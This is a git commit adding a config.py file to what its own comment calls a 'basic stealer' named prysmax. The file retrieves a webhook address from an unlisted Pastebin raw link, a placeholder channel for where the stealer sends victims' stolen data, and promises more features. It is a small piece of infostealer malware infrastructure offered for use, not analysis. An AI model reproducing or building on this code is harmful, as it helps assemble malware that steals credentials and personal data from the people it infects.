b6b06d6c32c8865c0393b7a2256efb0ccab38c95
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-03-30 00:38:07 -0300

    Create config.py

---
+++ config.py
@@ -0,0 +1,5 @@
+import requests
+
+hook = requests.get("https://pastebin.com/raw/U-LINK-HERE").text # create a pastebin unlisted and put here, FORMAT RAW IMPORTANT
+
+# soon new features xd. This is basic stealer, prysmax it's +++ powerfull
